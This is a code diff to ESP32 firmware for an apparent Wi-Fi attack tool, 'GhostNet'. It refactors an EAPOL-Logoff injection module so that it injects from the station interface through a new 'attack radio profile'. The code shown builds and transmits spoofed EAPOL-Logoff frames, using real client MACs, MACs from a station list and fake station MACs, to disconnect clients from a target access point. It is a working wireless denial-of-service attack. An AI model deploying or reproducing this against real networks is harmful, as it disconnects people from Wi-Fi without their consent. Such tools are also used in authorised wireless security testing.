@@ -78,7 +78,7 @@ static void eapol_logoff_task(void *param) {
             memcpy(&frame[10], sta_mac, 6);     // src: station
             memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
             
-            if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK) {
+            if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, sizeof(frame), false) == ESP_OK) {
                 eapol_logoff_packets_sent++;
             }
         } else if (strlen((const char *)selected_ap.ssid) > 0) {
@@ -96,7 +96,7 @@ static void eapol_logoff_task(void *param) {
                     memcpy(&frame[10], station_ap_list[j].station_mac, 6);    // src: station
                     memcpy(&frame[16], ap_bssid, 6);                          // bssid: ap
                     
-                    if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK) {
+                    if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, sizeof(frame), false) == ESP_OK) {
                         eapol_logoff_packets_sent++;
                     }
                     sent_any = true;
@@ -122,7 +122,7 @@ static void eapol_logoff_task(void *param) {
                 memcpy(&frame[10], fake_sta, 6);    // src: fake station
                 memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
                 
-                if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK) {
+                if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, sizeof(frame), false) == ESP_OK) {
                     eapol_logoff_packets_sent++;
                 }
             }
@@ -161,27 +161,16 @@ void eapol_logoff_start(void) {
         return;
     }
     
-    // Injecting on WIFI_IF_AP requires the AP interface to be active. Set AP
-    // mode here (as deauth/beacon-spam/channel-switch do) instead of relying on
-    // the WiFi manager having booted in APSTA — it now runs STA-only when the
-    // SoftAP is disabled in settings, so an ambient AP interface isn't guaranteed.
+    // Set the attack radio profile here (as deauth/channel-switch do) instead
+    // of relying on the WiFi manager having booted in APSTA — it now runs
+    // STA-only when the SoftAP is disabled in settings, so an ambient radio
+    // isn't guaranteed. The profile tears down the GhostNet AP (kicking any
+    // WebUI client) and injects from the STA interface.
     ap_manager_stop_services();
     esp_wifi_stop();
     vTaskDelay(pdMS_TO_TICKS(50));
 
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    wifi_protocols_t p = {
-        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
-        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
-    };
-    esp_wifi_set_protocols(WIFI_IF_AP, &p);
-    ESP_ERROR_CHECK(esp_wifi_start());
-#else
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    ESP_ERROR_CHECK(esp_wifi_start());
-    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-#endif
+    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
 
     eapol_logoff_running = true;
     eapol_logoff_packets_sent = 0;
@@ -197,7 +186,7 @@ void eapol_logoff_start(void) {
             eapol_logoff_task_handle = NULL;
         }
         esp_wifi_stop();
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("eapol logoff start");
 #ifdef CONFIG_WITH_STATUS_DISPLAY
         status_display_show_status("EAPOL start failed");
 #endif
@@ -228,7 +217,7 @@ void eapol_logoff_stop(void) {
     }
     
     esp_wifi_stop();
-    ap_manager_start_services();
+    (void)ap_manager_restore_after_attack("eapol logoff stop");
     
     glog("EAPOL-Logoff stopped. Total: %lu packets\n", (unsigned long)eapol_logoff_packets_sent);
 #ifdef CONFIG_WITH_STATUS_DISPLAY
